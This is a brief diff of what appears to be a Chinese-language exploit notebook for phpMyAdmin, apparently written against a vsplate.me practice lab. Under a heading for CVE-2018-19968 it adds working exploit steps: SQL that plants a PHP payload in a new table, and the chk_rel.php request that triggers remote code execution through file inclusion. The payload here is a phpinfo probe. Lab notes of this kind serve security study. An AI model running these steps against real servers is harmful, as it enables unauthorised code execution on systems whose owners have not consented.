@@ -27,5 +27,12 @@ http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%2
 
 
 # CVE-2018-19968 远程代码执行文件包含
-- 
+```
+#执行SQL
+CREATE DATABASE foo;
+CREATE TABLE foo.bar ( baz VARCHAR(100) PRIMARY KEY );
+INSERT INTO foo.bar SELECT ‘<?php phpinfo(); ?>’;
+#访问
+chk_rel.php?fixall_pmadb=1&db=foo
+```
 
